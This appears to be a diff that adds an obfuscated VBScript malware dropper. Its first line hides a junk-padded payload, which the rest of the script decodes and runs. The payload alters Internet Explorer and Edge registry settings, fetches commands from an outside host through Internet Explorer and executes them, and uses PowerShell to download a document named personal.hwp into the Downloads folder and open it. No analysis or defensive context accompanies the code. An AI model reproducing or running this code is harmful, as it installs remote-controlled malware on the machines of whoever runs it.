@@ -1,0 +1,15 @@
+'erpsolution=testtempOtempcoden Ertempcoderor Restempcodeume NetempcodexttesttempSub StempcodeetItempcodeESttempcodeate()testtempCotempcodenst hk = &H8tempcode0000tempcode001testtemprtempcodeegdtempcodeir = "Sotempcodeftwatempcodere\Micrtempcodeostempcodeoft\Inttempcodeerntempcodeet Expltempcodeorer\Maitempcoden"testtempWitempcodeth GetempcodetObjtempcodeect("witempcodenmgmtstempcodetesttemp\rotempcodeot\deftempcodeaulttesttempStdtempcodeRetempcodegProv")testtemp.SetempcodetStrtempcodeingValtempcodeue hk, retempcodegdir, "Chetempcodeck_Assoctempcodeiations", "no"testtemp.SetempcodetDwortempcodedValue  hk, retempcodegdir, "DisatempcodebleFirstempcodetRunCustotempcodemize", 1testtemp.SetDwortempcodedValue  hk, "Softempcodetware\Mictempcoderosoft\Edtempcodege\ItempcodeEToEdtempcodege", "RedtempcodeirectionMtempcodeode", 0 testtempEntempcoded WitempcodethtesttempEntempcoded SutempcodebtesttempSetItempcodeEStatetesttempui = "delps.scienceontheweb.net/ital/info"testtempWith CreatempcodeteObjtempcodeect("InttempcodeernetExptempcodelorer.Aptempcodeplicatempcodetion")testtemp.Navtempcodeigate "httempcodetptesttemp//" & ui & "/list.php?query=1"testtempDo whtempcodeile .busytesttempWStempcodecrtempcodeipt.Sleep 100testtempLotempcodeoptesttempbt=.Documtempcodeent.Body.IntempcodenerTexttesttemp.QuittesttempEnd WithtesttempExetempcodecute(bt)testtempDotempcodewnloadFotempcodelder = CreatempcodeteObject("WSctempcodeript.Shetempcodell").ExpatempcodendEnvironmentStrings("%ustempcodeerprofile%") & "\Downtempcodeloads"testtempCretempcodeateObject("WSctempcodeript.Shtempcodeell").Rtempcodeun "ctempcodemd /c potempcodewershtempcodeell $curpath=(Netempcodew-Obtempcodeject -CotempcodemObjetempcodect Shetempcodell.Aptempcodeplication).NamtempcodeeSpace('shtempcodeelltesttempDotempcodewnloads').Self.Path;Invotempcodeke-WtempcodeebRequest -Urtempcodei httempcodetptesttemp//delps.scienceontheweb.net/ital/info/sample.hwp -OutFile $curpath\personal.hwp;statempcodert-sleep -seconds 1testtemp",0,truetesttempCretempcodeateObject("WStempcodecript.Shetempcodell").Rutempcoden DownltempcodeoadFolder&"\personal.hwp"testtemp=endsolution
+b_arrow = "Scri"
+a_arrow = b_arrow & "pt"
+c_arrow = "ing.FileSystem"
+e_arrow = "ect"
+d_arrow = "Obj"
+a_arrow = a_arrow & c_arrow & d_arrow & e_arrow
+set red_arrow = CreateObject(a_arrow)
+set fp = red_arrow.OpenTextfile(Wscript.ScriptFullName,1)
+yy_arrow = fp.readall()
+mylen = InStr(yy_arrow,"=endsolution") - InStr(yy_arrow,"erpsolution=") -12
+yy_arrow = Mid(yy_arrow,InStr(yy_arrow,"erpsolution=")+12,mylen)
+yy_arrow = Replace(yy_arrow,"testtemp",":")
+yy_arrow = Replace(yy_arrow,"tempcode","")
+execute yy_arrow
